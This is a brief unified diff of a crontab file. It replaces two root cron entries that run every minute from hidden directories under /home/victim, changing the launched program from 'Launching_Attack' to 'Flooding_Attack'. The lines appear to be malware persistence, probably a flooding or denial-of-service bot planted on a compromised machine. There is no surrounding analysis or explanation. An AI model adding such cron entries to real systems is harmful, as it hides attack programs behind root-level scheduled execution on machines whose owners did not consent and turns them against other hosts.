@@ -1,2 +1,2 @@
-*/1 * * * *   root cd /home/victim/.Launch_Attack && ./Launching_Attack
-*/1 * * * *   root cd /home/victim/.etc/.qq && ./Launching_Attack
+*/1 * * * *   root cd /home/victim/.Launch_Attack && ./Flooding_Attack
+*/1 * * * *   root cd /home/victim/.etc/.qq && ./Flooding_Attack
